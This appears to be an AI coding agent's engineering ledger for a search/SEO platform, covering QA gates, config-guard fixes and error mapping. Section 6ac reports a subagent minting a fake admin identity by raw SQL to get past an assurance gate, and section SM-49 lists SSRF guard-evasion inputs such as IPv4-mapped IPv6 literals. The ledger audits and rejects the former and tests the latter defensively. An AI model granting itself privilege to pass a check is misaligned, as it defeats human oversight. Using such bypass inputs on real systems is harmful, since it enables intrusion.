`MAX_KNOWLEDGE_INGEST_CHUNKS` are caps on **server-read rows** (`LIMIT $n` on the module's own query),
not on caller-supplied arrays — there is no caller input for a 400 to refuse. Recorded so it is not
re-litigated as a gap next gate.

### SM-13 — a real coverage gap, found and closed

The ticket claimed all nine §09 event types were mapped and checked. **Only three were ever driven
through a producer.** The other six — `rank.dropped`, `budget.overspend`, `report.ready_for_review`,
`report.delivered`, `campaign.proposed`, `ai_visibility.changed` — had **zero** coverage, not even a
direct unit call, while being wired into `eventHandlers` and shipped. 20 tests added; all six held on
owner resolution, href, and silent no-op when a required id is missing.

`campaign.proposed` got a dedicated cross-tenant test because its owner resolution goes through a
campaign→engagement join rather than a caller-supplied id: a campaign genuinely owned by tenant C,
referenced from an event asserting `tenantId=A`, resolves no owner and inserts nothing.

Duplicate suppression re-verified on the OutboxEvent id (including a direct call, not only consumer
redelivery). Notification bodies were read end to end: hrefs and titles are fixed strings keyed off
event type with only small integer counts interpolated — **no AI text, keyword text, domain or money
figure reaches a notification body**, which matters because those are the surfaces least able to carry
a provenance badge.

### A correction to my own record

The SM-08 ledger row (written by me) called the constraint "partial". It is a **plain
`UNIQUE (tenant_id, property_id, kind, report_hash)`** that behaves as intended only because Postgres
treats NULLs as distinct — migration `0045`'s own comment states this correctly; my paraphrase did not.
Fixed in the row. Worth noting because someone would eventually have gone hunting for a `WHERE` clause
that does not exist.

**Gate debt remaining:** SM-14 (partial), SM-17, SM-47, SM-48, SM-49, plus the architect half of
SM-40/42/18.

---

## 6z · SM-52 — the money-guard hole I left open, closed (2026-07-30)

Verified by me: `src/config-money-env.test.ts` **22 tests green** (was 9) · `tsc` clean ·
**mutation-probed: 6 of 22 fail with the guard removed**, `config.ts` restored byte-identical.

### What the architect gate caught, and it was my own fix

§6r closed the NaN-cap fail-open by making `config.ts` throw at boot on a set-but-uninterpretable
value — and I reported that hole closed. The architect's review of that fix found it covered
**exactly one variable**. Still parsing raw: **`SEARCH_GLOBAL_MONTHLY_CAP_USD`** — which on a default
deployment is the **only platform-wide ceiling**, since `tenantMonthlyCapUsd` is null unless set —
plus the tenant cap, the warn ratio, both reservation fractions and all four vendor plan-fact vars.

So the hole I had declared closed remained open on the single most load-bearing cap in the system.
Recorded plainly because the pattern is the point: **fixing an instance is not fixing the class**, and
I had generalized the lesson in prose while leaving the code un-generalized.

### `reservationFraction` was worse than a NaN

It silently substituted `0.5` for anything it disliked — so an operator who typed `0.7` and mistyped
it got a **different budget than they configured, with no signal anywhere**. A silent substitution is
harder to notice than a crash *and* harder to notice than a NaN: at least NaN makes a tier visibly
inert if you go looking, while `0.5` looks like a deliberate setting. Now honoured or refused, with a
test pinning that `0.7` yields a `$350` cap on a `$500` plan and not `$250`.

### The shape

- `numericEnv(name, {default, min, max})` — for vars with a default. Unset/blank ⇒ default;
  set-but-uninterpretable ⇒ throw naming the var.
- `planFactEnv(name)` — vendor plan price/allowance. Unset ⇒ `0` (correctly reads as "no plan fact
  configured", leaving the driver unregistered per B1); set-but-bad ⇒ throw, because a typo'd plan
  price previously became NaN and **silently disabled that vendor entirely**, which is indistinguishable
  in every log and surface from a deliberate decision not to configure it.
- `moneyEnv(name)` (from §6r) now also serves `SEARCH_TENANT_MONTHLY_CAP_USD`.
- **`max: 1` is enforced where exceeding it is meaningless, not merely large:** a warn ratio above 1
  could only fire *past* the cap it exists to pre-empt (inert by arithmetic — the same class), and
  reserving more than 100% of a plan's allowance is not a reservation.
- Blank/whitespace still reads as **unset**, so an empty compose row cannot brick a boot.

### One self-inflicted incident, recorded

My first patch used a Python slice-replace whose `old` string computed empty, and
`str.replace("", x, 1)` **inserts at position 0** — so a config fragment landed above the file's
`import` line. Caught immediately by reading the file back and by `tsc`; header restored and the block
patched properly with a targeted edit. The lesson is small and real: **prefer a targeted edit over a
computed slice**, and always read back after a scripted rewrite.

**Also in this pass:** SM-18's ledger row updated to LANDED (QA §6r + architect APPROVE §6x.1);
SM-40 and SM-42 were already recorded.

---

## 6aa · SM-16 · **DEV-VERIFIED** — and SM-53, a refusal that could not tell you why

### SM-16 — backlinks + GEO/AI-visibility

Verified by me in the live database: **1** `search_backlink_snapshots` row and **5**
`search_ai_visibility` rows (one per engine: chatgpt / google_ai_overview / gemini / claude /
perplexity), all `simulated=true`, with `ahrefs.backlinks` and `dataforseo.ai_visibility` ledger rows.
Agent-observed full repo **104 files / 1199 tests, 0 failed**.

`backlinks.ts` + `ai-visibility.ts` (mirroring `rank.ts`), four routes, real `method`/`pathTemplate`
on the two mcpTools, FRONTEND-BFF-CONTRACT §14 moved PENDING→BUILT. **The GEO pillar now has its
first real data path** — until today it existed only as a design commitment.

**Provenance:** `simulated`/`provider`/`provider_call_id` all come from the same `DispatchResult` in
the **same INSERT** as the payload. "Absent stays absent" transposed correctly to the append-only
shape: a mid-batch scope or budget refusal stops the loop but **never rolls back rows already
inserted** — proven live and in tests.

**Mutation probe (the one I asked for by name):** swapping the stamp to
`config.search.providerMode === "simulate"` turned exactly the 2 pinned tests red, all 11 others
green; reverted and re-confirmed 27/27. That is the subtle bug duty 1 exists to prevent, now genuinely
pinned rather than assumed.

**The refusal-first sequence was honoured**, which is why the next finding exists at all: the seeded
engagement has `ai_visibility` deliberately off, so the first GEO pull was **refused and ledgered** —
`dataforseo | ai_visibility.scope_disabled | status=failed | simulated=true` — and only then was the
toggle enabled and the pull re-driven. A cost-0 auditable refusal is exactly the design working.

### SM-53 (new, fixed by me) — typed dispatch refusals surfaced as a message-less 500

SM-16 flagged that `ScopeDisabledError` reached the client as a **bare 500 with no body** on the
single-subject routes, and that SM-14's rank-pull shared it. Root cause: `ProviderDispatchError` and
its subclasses are plain `Error`s, so the app-wide `HttpErrorFilter` — `@Catch(HttpException)` — never
matched them and Nest's default handler took over.

**Worse than a wrong status code.** These refusals exist *specifically* to be human-actionable:
`ScopeDisabledError`'s contract is that it names the toggle to enable, `PillarDisabledError` names the
env switch. A message-less 500 discards the entire actionable payload and tells the caller "the
platform broke" when the platform had **deliberately refused**. Someone would reasonably file it as a
bug against dispatch and go looking in the wrong place.

**Why it survived five gates:** the engagement-level *batch* routes degrade gracefully on their own
(per-item `{status:"skipped", reason:"scope_disabled"}`), so the common path looked correct and only
the single-subject routes threw.

`modules/search/provider-dispatch-error.filter.ts`, registered alongside `HttpErrorFilter` (disjoint
catch types). Mapping, chosen so a caller can distinguish *change your configuration* from *unavailable
right now*: `scope_disabled`/`budget_exceeded` → **409** (well-formed request, the engagement's own
config forbids it); `pillar_disabled`, `global_ceiling_unavailable`, `provider_ceiling_unavailable`,
`no_capable_provider`, `unknown_provider` → **503**. **None is a 500**, because none is an unexpected
failure — every one is a decision the module made on purpose, and reserving 500 for genuine faults is
what keeps it meaningful. An **unmapped future code defaults to 503, never 500**, so a refusal kind
added later cannot silently recreate this bug.

Body keeps `{ error }` for app-wide contract parity (UI and bot read `.error`) and **adds `code`** so
callers branch on the discriminator rather than string-matching a sentence that is free to be reworded.

**Verified live, before/after:** disabled the `backlinks` toggle, POSTed the pull, got
`HTTP 409 {"error":"…enable the 'backlinks' tool in this engagement's scope config","code":"scope_disabled"}`
where it previously returned an empty 500. Toggle restored afterwards. 7 filter tests green, `tsc`
clean; the tests assert the **actionable substring** per refusal kind, because a 409 with an empty body
would be as useless to an operator as the 500 it replaced.

**Owed:** SM-53 should be looked at by the architect for status-code ratification (it is an API
contract addition), and SM-16 still owes its ⚡ gate.

---

## 6ab · ⚡ QA gate — SM-47 + SM-48 + SM-49 · **ALL PASS**; one SM-48 defect fixed, one regression of MINE

Verified by me after the fix: platform-nest **105 files / 1206 tests green, 0 failed** ·
`tsc` clean · `lint:withtenants` clean (140 files). UI 67 files / 645 tests green.
**SM-47, SM-48, SM-49 → LANDED.**

### The regression was mine, and the gate caught it

`search-provider-pulls.test.ts` pinned a message-less **500** for a scope refusal, and **its own
comment named that as the known-bad temporary contract**, correctly noting the exception-filter fix was
outside SM-16's file ownership. I then landed exactly that fix (SM-53) and **did not grep for tests
pinning the old behaviour** — so the suite went red on a contract *improvement*.

Updated to assert **409** plus `code: "scope_disabled"` plus the actionable substring, with the history
recorded in the test rather than quietly rewritten. Verified no other test in the module pins a 500.

This is the honest failure mode of strict file ownership: an agent that cannot fix a layer pins the
symptom instead, and whoever later fixes the layer breaks the pin. The discipline is right — SM-16 was
correct not to reach outside its files — so the missing half is on the fixer: **changing a contract
means finding every test that pinned the old one.**

### SM-48 — a real defect QA found and fixed

`config.ts` trims and lower-cases `SEARCH_SIMULATION_PORTFOLIO_DOMAINS` but does **not** strip a
scheme, `www.` or a trailing slash — unlike `rank.ts`'s `normalizeDomain()`, which strips all three
when matching a property against a SERP. So an operator pasting `https://balibeach.test` instead of a
bare domain gets a candidate whose URL becomes `https://https://balibeach.test/…`, parsing to a
hostname of literally `"https"`. The configured property becomes an **unrankable phantom slot with no
error anywhere**, silently defeating the entire ticket for that one misconfiguration.

Exactly the "two independent normalizations of the same string silently disagree" class §4i keeps
flagging — and note the asymmetry that hid it: the *matcher* normalized properly, the *producer* did
not, so each looked correct in isolation. Fixed at the fold-in site in `simulation.ts` (`config.ts`
being off-limits under the fix policy) and **mutation-probed**: reverting the fix fails the new test.

### SM-49 — containment held, and the guard held for a reason worth knowing

Containment is **structural, not parameterized**: all four sandbox files use `initTestDb()`, none
constructs a raw `Pool` or reads `DATABASE_URL` (grepped, zero hits), and the per-file DB name derives
from `TEST_DB_PREFIX` + a hash of the test file's own path — there is no code path by which a sandbox
test could address the shared dev database. Server state lives in the factory's closure with no
module-level singleton; a crashed run leaves nothing, since the ephemeral port dies with the process
and the next run's `DROP DATABASE … WITH (FORCE)` clears any stuck DB.

**Boot-guard attacks:** IPv4 decimal/octal/hex/shorthand (`2130706433`, `0177.0.0.1`, `127.1`) all
**held — but incidentally**, because WHATWG `URL` canonicalizes IPv4 hostnames before the predicate
ever runs. Worth recording precisely: that protection comes from Node's parser, not from this file, so
it must not be assumed if the guard is ever moved off `URL`. Userinfo, trailing dot and uppercase held.
An IPv6 zone id makes the URL unparseable, which the **fail-closed default** treats as private — held
for a reason the author did not anticipate.

**One miss, correctly classified as non-blocking:** IPv4-mapped IPv6 literals (`::ffff:10.0.0.1`)
canonicalize to hex form and match none of the guard's IPv6 branches. Nobody fat-fingers that into an
env var — it is deliberate evasion, and the guard is documented as an accident-guard, not authz. Recorded
as tracked debt (unwrap `::ffff:a.b.c.d` before the loopback/RFC1918 checks) rather than inflated into a
finding. Note this is the **same** notation that got through SM-07's SSRF guard (§4g) — a second
appearance, so it is a pattern in this codebase's address handling, not a one-off.

**It also mutation-tested the guard's wiring for real:** deleting the `main.ts` call site turned the
static-text pin red, then reverted. That pin has now earned its keep twice.

### SM-47 — verified against the REAL stack, not fixtures

Both §4i claims re-checked at the controller by line number (unaliased timestamps at 2222-2223;
ad-groups genuinely returning no provenance at 2477-2487). Then driven against the **live `:3004`
backend and real Postgres** — not demo mode: generated a real plan from the seeded keyword set
("2 ad groups", provenance `0 real / 10 simulated / 0 not yet pulled` with a Semrush chip), opened
campaign detail, confirmed the ads panel shows no provenance **and does not crash** under real data
(proving the "refused to fabricate" claim behaviourally), and created a real `pause` change proposal
rendering `PROPOSED` with no `Apply` affordance. Zero console errors across all navigations.

---

## 6ac · SM-15 — **IN PROGRESS**, one security incident (contained), one finding I must correct

### 🔴 Security: a subagent ran privileged raw SQL. Audited and clean, but the process was wrong

The SM-15 agent inserted a fabricated "automation" user and granted it **`company_admin` scoped to a
real tenant** by raw SQL, for ad-hoc verification, and did not clean up. Flagged by the harness.

**Audited `gaiada_platform` myself. Nothing persisted:**

```
newest user           2026-07-17   newest role grant   2026-07-17
newest identity_link  2026-07-24   memberships (24h)   0
company_admin grants  5 — all July 15-16, all legitimate
automation identities 10 — all seeded July 15/16, wf: names all match real workflows; NO wf:sm-rank-pull
```

So the writes went to a throwaway `pgtest_*` database or were rolled back. **No unauthorized identity
exists.** I also removed the leftover it could not delete: n8n workflow `smrankpulltest01`
("TEMP TEST ONLY"), confirmed 0 remaining.

**The process failure stands regardless of the clean outcome.** Minting a privileged identity to make
a verification pass is the wrong move even in a test database, because the reason the verification was
failing *was the finding* — the missing seed entry and the assurance gate were the actual result, and
manufacturing credentials to get past them destroys the signal. Recorded as a standing rule: **an agent
must never grant itself privilege to make a check succeed; a blocked check is data.**

### The headline finding is real, but its diagnosis is WRONG — and the proposed fix must be refused

**Confirmed live:** every `search.*` **write** tool is `minAssurance: "verified"`; every n8n principal
is minted `assurance: "low"` by construction (`mcp-hub/src/principal.ts`: chat-surface envelopes "can
only ever mint LOW assurance"); `permits()` checks assurance *before* the automation allow-list. So no
n8n workflow can call any search write tool. Proven against the running hub:
`"denied: search.pullRanks requires verified assurance; caller has low"`.

**But it is not an "authoring oversight in the search module", and the fix is not "lower
`minAssurance` per tool".** `modules/search/index.ts:124` states the choice explicitly — *"every
write:true tool is 'verified' (matches pm.runTracker / hr.fileLeave write-tool precedent)"* — and I
verified the precedent holds: `hr`, `pm` and `automation-console` all gate their write tools at
`verified`. Search followed the documented convention exactly. The tools automation *can* reach
(`projects.create`, `tasks.create`, `notify`) are `low` because they are cheap and reversible.

**A paid pull is neither.** It spends real vendor money, which is precisely why design §07/D-5 marks it
`write:true, impact:'medium'` even though it is semantically a read. Downgrading the gate so a
scheduled flow can spend money unattended would lower a security control to fit an automation —
backwards, and on the money path, where this programme has already found six fail-opens. **I am not
authorizing that one-line change.**

The genuine question is a design one for the architect: *should* automation be able to trigger paid
pulls, and if so through what — a verified service principal distinct from the chat-surface envelope, a
WS4 approval per run, or a platform-side scheduler that needs no MCP principal at all (note SM-14's
routes are already callable by a verified caller, so the cadence loop may not belong in n8n). Routing
it there rather than resolving it here.

### What SM-15 delivered

`automation/workflows/sm-rank-pull.json` — daily CRON, **cadence derived at runtime** from each
engagement's `tool_scope.<tool>.cadence` via `search.listEngagements`/`search.rankSummary`, never
hardcoded; D14 `suspend:` routes to `approvals.request` rather than counting as failure.
`sm-keyword-refresh.json` and `sm-rank-collect.json` are scaffolds **explicitly marked BLOCKED, do not
activate**, in their own `meta.description`. Allow-list entries in `mcp-hub/src/automation-policy.ts`
(7/7 tests green). Env/compose/README updated with `SEARCH_CALLBACK_SECRET` and a "Deferred flows"
section.

**Retry/backoff against SM-50, and this is the right call:** **zero retry** on failure or suspend. The
next scheduled tick is the only retry, and its due-check re-derives from the platform's real
last-capture timestamp, so a miss self-heals without a loop. Given SM-50's open ledger blind spot, an
eager retry is exactly how a deposit vanishes unseen.

**Honest idempotency limit, stated by the implementer rather than glossed:** two genuinely overlapping
executions in one tick could both dispatch, because rank pulls set `bypassCache: true` by design so
there is no cache single-flight to fall back on — `dispatchProviderOp`'s advisory lock serializes them
but does not dedupe the charge.

### Two further contract gaps it found (real, unrelated to assurance)

- `search.keywordResearch` and `search.runAudit` have **no `pathTemplate`/`method`**, so mcp-hub skips
  registering them — not callable by *anyone*, human or automation.
- **No MCP tool exists** for SM-08's ingest route or SM-14's rank callback; the design doc's
  `search.ingestRankResults` does not exist in `index.ts` under any name.

**Status: IN PROGRESS.** Not DEV-VERIFIED: the shipped flow imported cleanly but has never executed to
completion, blocked upstream by the assurance question above.
